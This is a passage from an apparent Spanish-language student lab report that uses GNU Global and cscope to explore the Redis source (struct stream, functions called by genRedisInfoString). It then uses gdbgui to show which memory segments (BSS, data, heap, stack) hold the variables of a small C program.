<li>Línea 28: (segundo resultado) → Corresponde donde se cierra la estructura y se define el <code>typedef stream</code> (el alias sin <code>struct</code>). Forma parte de la misma declaración, pero ya no es el <code>struct stream</code> sino el nombre de tipo abreviado <code>stream</code>.</li>
</ul>
</li>
</ul>
<p><strong>Usando GNU Global con <code>global -x stream</code> localizamos la declaración de struct stream en el archivo src/stream.h, en la línea 16.</strong></p>
<h3 id="buscar-declaraci%C3%B3n-struct-stream-con-cscope"><strong>Buscar declaración struct stream con Cscope</strong></h3>
<pre class="hljs"><code><div>cscope -d -L4 &quot;struct stream&quot;
</div></code></pre>
<p><img src="capturas/struct-stream-2.png" alt="struct-stream.png">
donde:</p>
<ul>
<li><code>-d</code> → Para que use la BD existente, no la reconstruye.</li>
<li><code>-L4</code> → tipo de búsqueda <code>Find this text string</code>.</li>
</ul>
<p><strong>Usando scope vemos todas las líneas donde aparace: <code>struct stream</code>. Por ello vemos múltiples resultados</strong></p>
<p><strong>Para que busque como cadena completa y SÓLO muestre un único resultado:</strong></p>
<pre class="hljs"><code><div>cscope -d -L4 &quot;typedef struct stream &quot;
                         #          ^ espacio al final
</div></code></pre>
<p><img src="capturas/struct-stream-3.png" alt="struct-stream.png"></p>
<p><strong><mark>Solución: La declaración de struct stream está en:</strong></mark></p>
<ul>
<li>Archivo → <code>src/stream.h</code>.</li>
<li>Línea → 16.</li>
</ul>
<div style="page-break-before: always;"></div>
<h2 id="5-enumeraci%C3%B3n-de-las-funciones-que-llaman-la-funci%C3%B3n-genredisinfostring"><strong>5. Enumeración de las funciones que llaman la función <code>genRedisInfoString</code></strong></h2>
<h3 id="enumerar-funciones-que-llaman-a-genredisinfostring-con-cscope-en-modo-no-interactivo"><strong>Enumerar funciones que llaman a genRedisInfoString con Cscope en Modo NO interactivo</strong></h3>
<pre class="hljs"><code><div>cscope -d -L2 genRedisInfoString &gt; genRedisInfoString.txt
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-d</code> → Para que use la base de datos existente, no la reconstruye.</li>
<li><code>-L2</code> → <code>functions called by this function</code>.</li>
<li><code>genRedisInfoString</code> → la función que queremos analizar.</li>
</ul>
<p>Resultado que vemos por línea: Archivo donde está la referencia. Función llamada por <code>genRedisInfoString</code>. Número de línea. Un poco del código de esa línea:</p>
<pre class="hljs"><code><div>src/server.c sdsempty 5969 sds info = sdsempty();
src/server.c dictFind 5976 if (all_sections || (dictFind(section_dict,&quot;server&quot;) != NULL)) {
src/server.c sdscat 5994 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c uname 5998 uname(&amp;name);
src/server.c sdscatfmt 6002 info = sdscatfmt(info, &quot;# Server\r\n&quot; FMTARGS(
src/server.c FMTARGS 6002 info = sdscatfmt(info, &quot;# Server\r\n&quot; FMTARGS(
src/server.c redisGitSHA1 6004 &quot;redis_git_sha1:%s\r\n&quot;, redisGitSHA1(),
src/server.c strtol 6005 &quot;redis_git_dirty:%i\r\n&quot;, strtol(redisGitDirty(),NULL,10) &gt; 0,
src/server.c redisGitDirty 6005 &quot;redis_git_dirty:%i\r\n&quot;, strtol(redisGitDirty(),NULL,10) &gt; 0,
src/server.c redisBuildIdString 6006 &quot;redis_build_id:%s\r\n&quot;, redisBuildIdString(),
src/server.c monotonicInfoString 6012 &quot;monotonic_clock:%s\r\n&quot;, monotonicInfoString(),
src/server.c aeGetApiName 6013 &quot;multiplexing_api:%s\r\n&quot;, aeGetApiName(),
src/server.c getpid 6016 &quot;process_id:%I\r\n&quot;, (int64_t) getpid(),
src/server.c isShutdownInitiated 6031 if (isShutdownInitiated()) {
src/server.c sdscatfmt 6032 info = sdscatfmt(info,
src/server.c commandTimeSnapshot 6034 (int64_t)(server.shutdown_mstime - commandTimeSnapshot()));
src/server.c getListensInfoString 6038 info = getListensInfoString(info);
src/server.c dictFind 6042 if (all_sections || (dictFind(section_dict,&quot;clients&quot;) != NULL)) {
src/server.c getExpansiveClientsInfo 6045 getExpansiveClientsInfo(&amp;maxin,&amp;maxout);
src/server.c totalNumberOfStatefulKeys 6046 totalNumberOfStatefulKeys(&amp;blocking_keys, &amp;blocking_keys_on_nokey, &amp;watched_keys);
src/server.c sdscat 6047 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6048 info = sdscatprintf(info, &quot;# Clients\r\n&quot; FMTARGS(
src/server.c FMTARGS 6048 info = sdscatprintf(info, &quot;# Clients\r\n&quot; FMTARGS(
src/server.c listLength 6049 &quot;connected_clients:%lu\r\n&quot;, listLength(server.clients) - listLength(server.slaves),
src/server.c getClusterConnectionsCount 6050 &quot;cluster_connections:%lu\r\n&quot;, getClusterConnectionsCount(),
src/server.c raxSize 6058 &quot;clients_in_timeout_table:%llu\r\n&quot;, (unsigned long long ) raxSize(server.clients_timeout_table),
src/server.c dictFind 6065 if (all_sections || (dictFind(section_dict,&quot;memory&quot;) != NULL)) {
src/server.c zmalloc_used_memory 6074 size_t zmalloc_used = zmalloc_used_memory();
src/server.c evictPolicyToString 6076 const char *evict_policy = evictPolicyToString();
src/server.c evalScriptsMemoryVM 6077 long long memory_lua = evalScriptsMemoryVM();
src/server.c functionsMemoryVM 6078 long long memory_functions = functionsMemoryVM();
src/server.c getMemoryOverheadData 6079 struct redisMemOverhead *mh = getMemoryOverheadData();
src/server.c updatePeakMemory 6085 updatePeakMemory(zmalloc_used);
src/server.c bytesToHuman 6087 bytesToHuman(hmem,sizeof(hmem),zmalloc_used);
src/server.c bytesToHuman 6088 bytesToHuman(peak_hmem,sizeof(peak_hmem),server.stat_peak_memory);
src/server.c bytesToHuman 6089 bytesToHuman(total_system_hmem,sizeof(total_system_hmem),total_system_mem);
src/server.c bytesToHuman 6090 bytesToHuman(used_memory_lua_hmem,sizeof(used_memory_lua_hmem),memory_lua);
src/server.c bytesToHuman 6091 bytesToHuman(used_memory_vm_total_hmem,sizeof(used_memory_vm_total_hmem),memory_functions + memory_lua);
src/server.c bytesToHuman 6092 bytesToHuman(used_memory_scripts_hmem,sizeof(used_memory_scripts_hmem),mh-&gt;eval_caches + mh-&gt;functions_caches);
src/server.c bytesToHuman 6093 bytesToHuman(used_memory_rss_hmem,sizeof(used_memory_rss_hmem),server.cron_malloc_stats.process_rss);
src/server.c bytesToHuman 6094 bytesToHuman(maxmemory_hmem,sizeof(maxmemory_hmem),server.maxmemory);
src/server.c sdscat 6096 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6097 info = sdscatprintf(info, &quot;# Memory\r\n&quot; FMTARGS(
src/server.c FMTARGS 6097 info = sdscatprintf(info, &quot;# Memory\r\n&quot; FMTARGS(
src/server.c dictSize 6120 &quot;number_of_cached_scripts:%lu\r\n&quot;, dictSize(evalScriptsDict()),
src/server.c evalScriptsDict 6120 &quot;number_of_cached_scripts:%lu\r\n&quot;, dictSize(evalScriptsDict()),
src/server.c functionsNum 6121 &quot;number_of_functions:%lu\r\n&quot;, functionsNum(),
src/server.c functionsLibNum 6122 &quot;number_of_libraries:%lu\r\n&quot;, functionsLibNum(),
src/server.c freeMemoryGetNotCountedMemory 6144 &quot;mem_not_counted_for_evict:%zu\r\n&quot;, freeMemoryGetNotCountedMemory(),
src/server.c asmGetPeakSyncBufferSize 6152 &quot;mem_cluster_slot_migration_input_buffer_peak:%zu\r\n&quot;, asmGetPeakSyncBufferSize(),
src/server.c lazyfreeGetPendingObjectsCount 6158 &quot;lazyfree_pending_objects:%zu\r\n&quot;, lazyfreeGetPendingObjectsCount(),
src/server.c lazyfreeGetFreedObjectsCount 6159 &quot;lazyfreed_objects:%zu\r\n&quot;, lazyfreeGetFreedObjectsCount()));
src/server.c freeMemoryOverheadData 6160 freeMemoryOverheadData(mh);
src/server.c dictFind 6164 if (all_sections || (dictFind(section_dict,&quot;persistence&quot;) != NULL)) {
src/server.c sdscat 6165 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c atomicGet 6173 atomicGet(server.aof_bio_fsync_status,aof_bio_fsync_status);
src/server.c sdscatprintf 6175 info = sdscatprintf(info, &quot;# Persistence\r\n&quot; FMTARGS(
src/server.c FMTARGS 6175 info = sdscatprintf(info, &quot;# Persistence\r\n&quot; FMTARGS(
src/server.c elapsedMs 6181 (unsigned long ) elapsedMs(server.stat_current_cow_updated) / 1000 : 0),
src/server.c time 6191 -1 : time(NULL)-server.rdb_save_time_start),
src/server.c time 6202 -1 : time(NULL)-server.aof_rewrite_time_start),
src/server.c sdscatprintf 6214 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6214 info = sdscatprintf(info, FMTARGS(
src/server.c sdslen 6218 &quot;aof_buffer_length:%zu\r\n&quot;, sdslen(server.aof_buf),
src/server.c bioPendingJobsOfType 6219 &quot;aof_pending_bio_fsync:%lu\r\n&quot;, bioPendingJobsOfType(BIO_AOF_FSYNC),
src/server.c time 6239 elapsed = time(NULL)-server.loading_start_time;
src/server.c sdscatprintf 6247 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6247 info = sdscatprintf(info, FMTARGS(
src/server.c dictFind 6261 if (all_sections || (dictFind(section_dict,&quot;threads&quot;) != NULL)) {
src/server.c sdscat 6262 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6263 info = sdscatprintf(info, &quot;# Threads\r\n&quot;);
src/server.c atomicGet 6266 atomicGet(server.stat_io_reads_processed[j], reads);
src/server.c atomicGet 6267 atomicGet(server.stat_io_writes_processed[j], writes);
src/server.c sdscatprintf 6268 info = sdscatprintf(info, &quot;io_thread_%d:clients=%d,reads=%lld,writes=%lld\r\n&quot;,
src/server.c dictFind 6279 if (all_sections || (dictFind(section_dict,&quot;stats&quot;) != NULL)) {
src/server.c elapsedUs 6283 (long long ) elapsedUs(server.stat_last_eviction_exceeded_time): 0;
src/server.c elapsedUs 6285 (long long ) elapsedUs(server.stat_last_active_defrag_time): 0;
src/server.c atomicGet 6287 atomicGet(server.stat_net_input_bytes, stat_net_input_bytes);
src/server.c atomicGet 6288 atomicGet(server.stat_net_output_bytes, stat_net_output_bytes);
src/server.c atomicGet 6289 atomicGet(server.stat_net_repl_input_bytes, stat_net_repl_input_bytes);
src/server.c atomicGet 6290 atomicGet(server.stat_net_repl_output_bytes, stat_net_repl_output_bytes);
src/server.c atomicGet 6291 atomicGet(server.stat_client_qbuf_limit_disconnections, stat_client_qbuf_limit_disconnections);
src/server.c atomicGet 6298 atomicGet(server.stat_io_reads_processed[j], reads);
src/server.c atomicGet 6301 atomicGet(server.stat_io_writes_processed[j], writes);
src/server.c sdscat 6307 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6308 info = sdscatprintf(info, &quot;# Stats\r\n&quot; FMTARGS(
src/server.c FMTARGS 6308 info = sdscatprintf(info, &quot;# Stats\r\n&quot; FMTARGS(
src/server.c getInstantaneousMetric 6311 &quot;instantaneous_ops_per_sec:%lld\r\n&quot;, getInstantaneousMetric(STATS_METRIC_COMMAND),
src/server.c getInstantaneousMetric 6316 &quot;instantaneous_input_kbps:%.2f\r\n&quot;, (float )getInstantaneousMetric(STATS_METRIC_NET_INPUT)/1024,
src/server.c getInstantaneousMetric 6317 &quot;instantaneous_output_kbps:%.2f\r\n&quot;, (float )getInstantaneousMetric(STATS_METRIC_NET_OUTPUT)/1024,
src/server.c getInstantaneousMetric 6318 &quot;instantaneous_input_repl_kbps:%.2f\r\n&quot;, (float )getInstantaneousMetric(STATS_METRIC_NET_INPUT_REPLICATION)/1024,
src/server.c getInstantaneousMetric 6319 &quot;instantaneous_output_repl_kbps:%.2f\r\n&quot;, (float )getInstantaneousMetric(STATS_METRIC_NET_OUTPUT_REPLICATION)/1024,
src/server.c kvstoreSize 6336 &quot;pubsub_channels:%llu\r\n&quot;, kvstoreSize(server.pubsub_channels),
src/server.c dictSize 6337 &quot;pubsub_patterns:%lu\r\n&quot;, dictSize(server.pubsub_patterns),
src/server.c kvstoreSize 6338 &quot;pubsubshard_channels:%llu\r\n&quot;, kvstoreSize(server.pubsubshard_channels),
src/server.c dictSize 6341 &quot;migrate_cached_sockets:%ld\r\n&quot;, dictSize(server.migrate_cached_sockets),
src/server.c getSlaveKeyWithExpireCount 6342 &quot;slave_expires_tracked_keys:%zu\r\n&quot;, getSlaveKeyWithExpireCount(),
src/server.c trackingGetTotalKeys 6349 &quot;tracking_total_keys:%lld\r\n&quot;, (unsigned long long ) trackingGetTotalKeys(),
src/server.c trackingGetTotalItems 6350 &quot;tracking_total_items:%lld\r\n&quot;, (unsigned long long ) trackingGetTotalItems(),
src/server.c trackingGetTotalPrefixes 6351 &quot;tracking_total_prefixes:%lld\r\n&quot;, (unsigned long long ) trackingGetTotalPrefixes(),
src/server.c getInstantaneousMetric 6368 &quot;instantaneous_eventloop_cycles_per_sec:%llu\r\n&quot;, getInstantaneousMetric(STATS_METRIC_EL_CYCLE),
src/server.c getInstantaneousMetric 6369 &quot;instantaneous_eventloop_duration_usec:%llu\r\n&quot;, getInstantaneousMetric(STATS_METRIC_EL_DURATION)));
src/server.c genRedisInfoStringACLStats 6370 info = genRedisInfoStringACLStats(info);
src/server.c sdscatprintf 6372 info = sdscatprintf(info, &quot;cluster_incompatible_ops:%lld\r\n&quot;, server.stat_cluster_incompatible_ops);
src/server.c dictFind 6377 if (all_sections || (dictFind(section_dict,&quot;replication&quot;) != NULL)) {
src/server.c sdscat 6378 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6379 info = sdscatprintf(info,
src/server.c sdscatprintf 6397 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6397 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6414 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6414 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6423 info = sdscatprintf(info,
src/server.c sdscatprintf 6428 info = sdscatprintf(info,
src/server.c sdscatprintf 6433 info = sdscatprintf(info, &quot;total_disconnect_time_sec:%jd\r\n&quot;, (intmax_t)server.repl_total_disconnect_time+(current_disconnect_time));
src/server.c sdscatprintf 6435 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6435 info = sdscatprintf(info, FMTARGS(
src/server.c sdscatprintf 6441 info = sdscatprintf(info,
src/server.c replicationLogicalReplicaCount 6443 replicationLogicalReplicaCount());
src/server.c sdscatprintf 6449 info = sdscatprintf(info,
src/server.c listLength 6454 if (listLength(server.slaves)) {
src/server.c listRewind 6459 listRewind(server.slaves,&amp;li);
src/server.c listNext 6460 while ((ln = listNext(&amp;li))) {
src/server.c listNodeValue 6461 client *slave = listNodeValue(ln);
src/server.c replicationCheckHasMainChannel 6471 if (replicationCheckHasMainChannel(slave))
src/server.c connAddrPeerName 6479 if (connAddrPeerName(slave-&gt;conn,ip,sizeof(ip),&amp;port) == -1)
src/server.c replstateToString 6483 const char *state = replstateToString(slave-&gt;replstate);
src/server.c time 6486 lag = time(NULL) - slave-&gt;repl_ack_time;
src/server.c sdscatprintf 6488 info = sdscatprintf(info,
src/server.c sdscatprintf 6496 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6496 info = sdscatprintf(info, FMTARGS(
src/server.c getFailoverStateString 6497 &quot;master_failover_state:%s\r\n&quot;, getFailoverStateString(),
src/server.c dictFind 6509 if (all_sections || (dictFind(section_dict,&quot;cpu&quot;) != NULL)) {
src/server.c sdscat 6510 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c getrusage 6513 getrusage(RUSAGE_SELF, &amp;self_ru);
src/server.c getrusage 6514 getrusage(RUSAGE_CHILDREN, &amp;c_ru);
src/server.c sdscatprintf 6515 info = sdscatprintf(info,
src/server.c getrusage 6527 getrusage(RUSAGE_THREAD, &amp;m_ru);
src/server.c sdscatprintf 6528 info = sdscatprintf(info,
src/server.c dictFind 6537 if (all_sections || (dictFind(section_dict,&quot;module_list&quot;) != NULL) || (dictFind(section_dict,&quot;modules&quot;) != NULL)) {
src/server.c sdscat 6538 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6539 info = sdscatprintf(info,&quot;# Modules\r\n&quot;);
src/server.c genModulesInfoString 6540 info = genModulesInfoString(info);
src/server.c dictFind 6544 if (all_sections || (dictFind(section_dict,&quot;commandstats&quot;) != NULL)) {
src/server.c sdscat 6545 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6546 info = sdscatprintf(info, &quot;# Commandstats\r\n&quot;);
src/server.c genRedisInfoStringCommandStats 6547 info = genRedisInfoStringCommandStats(info, server.commands);
src/server.c dictFind 6551 if (all_sections || (dictFind(section_dict,&quot;errorstats&quot;) != NULL)) {
src/server.c sdscat 6552 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscat 6553 info = sdscat(info, &quot;# Errorstats\r\n&quot;);
src/server.c raxStart 6555 raxStart(&amp;ri,server.errors);
src/server.c raxSeek 6556 raxSeek(&amp;ri,&quot;^&quot;,NULL,0);
src/server.c raxNext 6558 while (raxNext(&amp;ri)) {
src/server.c sdscatprintf 6561 info = sdscatprintf(info,
src/server.c getSafeInfoString 6563 (int )ri.key_len, getSafeInfoString((char *) ri.key, ri.key_len, &amp;tmpsafe), e-&gt;count);
src/server.c zfree 6564 if (tmpsafe != NULL) zfree(tmpsafe);
src/server.c raxStop 6566 raxStop(&amp;ri);
src/server.c dictFind 6570 if (all_sections || (dictFind(section_dict,&quot;latencystats&quot;) != NULL)) {
src/server.c sdscat 6571 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6572 info = sdscatprintf(info, &quot;# Latencystats\r\n&quot;);
src/server.c genRedisInfoStringLatencyStats 6574 info = genRedisInfoStringLatencyStats(info, server.commands);
src/server.c dictFind 6579 if (all_sections || (dictFind(section_dict,&quot;cluster&quot;) != NULL)) {
src/server.c sdscat 6580 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6581 info = sdscatprintf(info,
src/server.c dictFind 6588 if (all_sections || (dictFind(section_dict,&quot;keyspace&quot;) != NULL)) {
src/server.c sdscat 6589 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6590 info = sdscatprintf(info, &quot;# Keyspace\r\n&quot;);
src/server.c kvstoreSize 6594 keys = kvstoreSize(server.db[j].keys);
src/server.c kvstoreSize 6595 vkeys = kvstoreSize(server.db[j].expires);
src/server.c estoreSize 6596 subexpiry = estoreSize(server.db[j].subexpires);
src/server.c sdscatprintf 6599 info = sdscatprintf(info,
src/server.c dictFind 6607 if (all_sections || (dictFind(section_dict,&quot;keysizes&quot;) != NULL)) {
src/server.c sdscat 6608 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6609 info = sdscatprintf(info, &quot;# Keysizes\r\n&quot;);
src/server.c serverAssert 6618 serverAssert(sizeof(typestr)/sizeof(typestr[0]) == OBJ_TYPE_BASIC_MAX);
src/server.c kvstoreSize 6631 if (kvstoreSize(server.db[dbnum].keys) == 0)
src/server.c kvstoreGetMetadata 6635 int64_t *kvstoreHist = kvstoreGetMetadata(server.db[dbnum].keys)-&gt;keysizes_hist[type];
src/server.c snprintf 6640 buflen += snprintf(buf + buflen, sizeof(buf) - buflen, &quot;db%d_%s:&quot;, dbnum, typestr[type]);
src/server.c snprintf 6646 int res = snprintf(buf + buflen, sizeof(buf) - buflen,
src/server.c sdscatprintf 6655 if (cnt) info = sdscatprintf(info, &quot;%s\r\n&quot;, buf);
src/server.c dictFind 6665 if (everything || dictFind(section_dict, &quot;modules&quot;) != NULL || sections &lt; (int )dictSize(section_dict) ||
src/server.c dictSize 6665 if (everything || dictFind(section_dict, &quot;modules&quot;) != NULL || sections &lt; (int )dictSize(section_dict) ||
src/server.c dictSize 6666 (all_sections &amp;&amp; dictSize(section_dict)))
src/server.c modulesCollectInfo 6669 info = modulesCollectInfo(info,
src/server.c dictFind 6670 everything || dictFind(section_dict, &quot;modules&quot;) != NULL ? NULL: section_dict,
src/server.c dictFind 6675 if (dictFind(section_dict, &quot;debug&quot;) != NULL) {
src/server.c sdscat 6676 if (sections++) info = sdscat(info,&quot;\r\n&quot;);
src/server.c sdscatprintf 6677 info = sdscatprintf(info, &quot;# Debug\r\n&quot; FMTARGS(
src/server.c FMTARGS 6677 info = sdscatprintf(info, &quot;# Debug\r\n&quot; FMTARGS(
</div></code></pre>
<h3 id="enumerar-funciones-que-llaman-a-genredisinfostring-con-cscope-en-modo-interactivo"><strong>Enumerar funciones que llaman a genRedisInfoString con Cscope en Modo interactivo</strong></h3>
<pre class="hljs"><code><div>cscope -d 
</div></code></pre>
<p>En el menú de cscope, escogemos la opción: 2 – <code>Find functions called by this function</code>:</p>
<p><img src="capturas/genRedisInfoString-3.png" alt="genRedisInfoString-3.png"></p>
<p>Escribimos la función que nos pide el ejercicio: <code>genRedisInfoString</code>:<br>
<img src="capturas/genRedisInfoString-4.png" alt="genRedisInfoString-3.png"><br>
donde:</p>
<ul>
<li>Hay 188 resultados en total pero sólo muestra las líneas 1-9.</li>
<li>Quedan 180 más por ver.</li>
<li>Para ver los siguientes resultados: Pulsamos la <code>barra espaciadora</code>.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-5---an%C3%A1lisis-de-las-variables-de-un-programa"><strong>Ejercicio 5 - Análisis de las variables de un programa</strong></h1>
<p>Vamos a analizar las variables de un programa y donde se van a ubicar en memoria.</p>
<p>Respecto del siguiente programa, indicad de que tipo son cada una de las variables, en que zona o segmento de la memoria se ubicará y que valor por defecto poseerá al inicio del programa.</p>
<pre class="hljs"><code><div>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
 
int gni;
int gi = 99;
 
void f() {
    static int eni;
    static int ei = 99;
 
    printf(&quot;Dir: %p Val: %i\n&quot;, &amp;eni, eni);
    printf(&quot;Dir: %p Val: %i\n&quot;, &amp;ei, ei);
}
 
int main() {
    f();
    int *pae = malloc(sizeof(int));
    printf(&quot;Dir: %p Val: %i\n&quot;, pae, *pae);
 
    *pae = 100;
    printf(&quot;Dir: %p Val: %i\n&quot;, pae, *pae);
 
    gni = 9;
    printf(&quot;Dir: %p Val: %i\n&quot;, &amp;gni, gni);
    printf(&quot;Dir: %p Val: %i\n&quot;, &amp;gi, gi);
 
    free(pae);
    return 0;
}
</div></code></pre>
<h2 id="previo-instalaci%C3%B3n-de-gdbgui"><strong>Previo: Instalación de gdbgui</strong></h2>
<p>Para comprobar dónde se almacenan las variables del programa, vamos a instalar gdbgui. Gdbgui es una interfaz gráfica para el depurador gdb que se ejecuta en el navegador web. Es una forma más amigable y visual de usar gdb para depurar, ver variables y examinar memoria.</p>
<p><strong>Instalamos gdbgui en un entorno virtual python en linux:</strong></p>
<pre class="hljs"><code><div># 1) Preparar
sudo apt install python3 python3-pip python3-venv gdb

# 2) Proyecto python + Entorno virtual venv
mkdir ~/gdbgui_project
cd ~/gdbgui_project
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install gdbgui

# 3) Ejecutar
gdbgui
</div></code></pre>
<p><strong>Compilamos con símbolos el programa del ejercicio:</strong></p>
<pre class="hljs"><code><div>gcc -g -O0 ejercicio5.c -o ejercicio5
</div></code></pre>
<p><strong>Cargamos el binario en gdbgui:</strong><br>
Normalmente en el navegador, accedemos a http://127.0.0.1:5000 y abrimos el binario compilado para ir viendo las variables.</p>
<pre class="hljs"><code><div>./ejercicio5
</div></code></pre>
<p><img src="capturas/gdbgui-3.png" alt="gdbgui-3.png"></p>
<p><img src="capturas/gdbgui-2.png" alt="gdbgui-2.png"></p>
<p><img src="capturas/gdbgui-4.png" alt="gdbgui-4.png"></p>
<p><strong>Añadimos breakpoints clave en gdbgui:</strong></p>
<ul>
<li>En la función f().</li>
<li>En main() en la línea: int *pae = malloc(sizeof(int));</li>
<li>En main() en la línea: *pae = 100;</li>
<li>En main() en la línea: gni = 9;</li>
</ul>
<p><strong>Vemos algunos de los segmentos/secciones del ejecutable:</strong><br>
Escribimos en la consola integrada de gdbgui:</p>
<pre class="hljs"><code><div>(gdb) info files
</div></code></pre>
<p><img src="capturas/gdbgui-segmentos.png" alt="gdbgui-segmentos"></p>
<p><strong>Mostramos más detalles por sección:</strong></p>
<pre class="hljs"><code><div>(gdb) maintenance info sections
 ......
 [13]     0x555555555070-&gt;0x555555555270 at 0x00001070: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
 ......
 [24]     0x555555558018-&gt;0x555555558030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x555555558030-&gt;0x555555558040 at 0x00003030: .bss ALLOC
 .....
</div></code></pre>
<p><strong>Vemos el mapa de memoria del proceso:</strong><br>
Con esto podremos indentificar en qué segmento/región cae una dirección concreta:</p>
<pre class="hljs"><code><div>(gdb) info proc mappings
process 71413
Mapped address spaces:

Start Addr         End Addr           Size               Offset             Perms File 
...
0x0000555555559000 0x000055555557a000 0x21000            0x0                rw-p  [heap] 
...
0x00007ffff7f93000 0x00007ffff7f95000 0x2000             0x1e6000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6 
0x00007ffff7f95000 0x00007ffff7fa2000 0xd000             0x0                rw-p   
0x00007ffff7fbd000 0x00007ffff7fbf000 0x2000             0x0                rw-p   
0x00007ffff7fbf000 0x00007ffff7fc3000 0x4000             0x0                r--p  [vvar] 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x2000             0x0                r--p  [vvar_vclock] 
0x00007ffff7fc5000 0x00007ffff7fc7000 0x2000             0x0                r-xp  [vdso] 
0x00007ffff7fc7000 0x00007ffff7fc8000 0x1000             0x0                r--p  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
...
0x00007ffff7ffe000 0x00007ffff7fff000 0x1000             0x0                rw-p   
0x00007ffffffde000 0x00007ffffffff000 0x21000            0x0                rw-p  [stack] 
(gdb) 
</div></code></pre>
<h2 id="an%C3%A1lisis-de-las-variables-del-programa"><strong>Análisis de las variables del programa</strong></h2>
<p>Las variables del programa se reparten entre segmento de datos (inicializados y no inicializados), stack y heap, y sus valores por defecto dependen de si son estáticas/globales o automáticas/dinámicas.</p>
<h3 id="1-gni-global-no-inicializada"><strong>1. <code>gni</code> (Global No Inicializada)</strong></h3>
<ul>
<li><strong>Tipo:</strong> int. Entero con signo.</li>
<li><strong>Ámbito:</strong> Global.</li>
<li><strong>Duración:</strong> Estática. Existe durante toda la ejecución.</li>
<li><strong>Ubicación (Segmento):</strong> BSS (Block Started by Symbol). Este segmento almacena las variables globales y estáticas que no tienen una inicialización explícita en el código.</li>
<li><strong>Valor por defecto:</strong> 0. El sistema operativo limpia este segmento (lo pone a ceros) antes de ejecutar el main ya que es una variable global de almacenamiento estático sin inicializar.</li>
</ul>
<p><img src="capturas/gni.png" alt="gni">
donde:</p>
<ul>
<li>En el panel de expressions de gdbgui vemos la dirección de <code>gni</code>: <code>gni 0x5555555558034 int *</code> y <code>*gni 9 int</code>.</li>
<li>En el panel de memory de gbbgui vemos: <code>0x5555555558034 → bytes 09 00 00 00 ...</code> → valor 9 en little-endian, que coincide con la asignación <code>gni = 9;</code>.</li>
</ul>
<p><strong>Revisamos dónde cae esa dirección <code>0x5555555558034</code>:</strong><br>
Comparamos esta dirección con el resultado de <code>maintenance info sections</code>. Así identificaremos si la variable está en <code>.data</code>, <code>.bss</code>, <code>heap</code>, <code>stack</code>:</p>
<pre class="hljs"><code><div>(gdb) maintenance info sections
 ......
 [24]     0x555555558018-&gt;0x555555558030 at 0x00003018: .data ALLOC LOAD DATA HAS_CONTENTS
 [25]     0x555555558030-&gt;0x555555558040 at 0x00003030: .bss ALLOC
 [26]     0x00000000-&gt;0x0000001e at 0x00003030: .comment READONLY HAS_CONTENTS
 ......
</div></code></pre>
<p>donde:</p>
<ul>
<li>Inicio de <code>.bss</code>: 0x555555558030</li>
<li>Fin de <code>.bss</code>: 0x555555558040</li>
<li>Dirección de <code>gni</code>: 0x555555555803</li>
<li><strong><mark>Concluimos que la dirección de <code>gni</code> cae dentro del rango de la sección <code>.bss</code>, por lo tanto la variable <code>gni</code> está en <code>.bss</code>.</mark></strong></li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="2-gi-global-inicializada"><strong>2. <code>gi</code> (Global Inicializada)</strong></h3>
<ul>
<li><strong>Tipo:</strong> int. Entero con signo.</li>
<li><strong>Ámbito:</strong> Global.</li>
<li><strong>Duración:</strong> Estática. Existe durante toda la ejecución.</li>
<li><strong>Ubicación (Segmento):</strong> Data Segment (Datos Inicializados). Este segmento es para variables globales o estáticas a las que se les ha dado un valor inicial (= 99).</li>
<li><strong>Valor por defecto:</strong> 99. El valor se copia desde el archivo ejecutable a la memoria al iniciar el programa.</li>
</ul>
<p><img src="capturas/gdbgui-variable-gi.png" alt="gdbgui-variable-gi"></p>
<p><strong>Dirección de la variable <code>gi</code>:</strong></p>
<pre class="hljs"><code><div>p &amp;gi
$1 = (int *) 0x555555558028 &lt;gi&gt;
(gdb) 
</div></code></pre>
<p>Dirección de esta variable: <code>0x00000000000</code>.</p>
<ul>
<li>Por el mismo razonamiento anterior con las secciones:
<ul>
<li>Inicio de <code>.data</code>: <code>0x555555558018</code>.</li>
<li>Fin de <code>.data</code>: <code>0x555555558030</code>.</li>
<li><strong><mark>Concluimos que la dirección de <code>gi</code> cae dentro del rango de la sección <code>.data</code>, por lo tanto la variable <code>gi</code> está en <code>.data</code>.</mark></strong></li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="3-eni-est%C3%A1tica-no-inicializada"><strong>3. <code>eni</code> (Estática No Inicializada)</strong></h3>
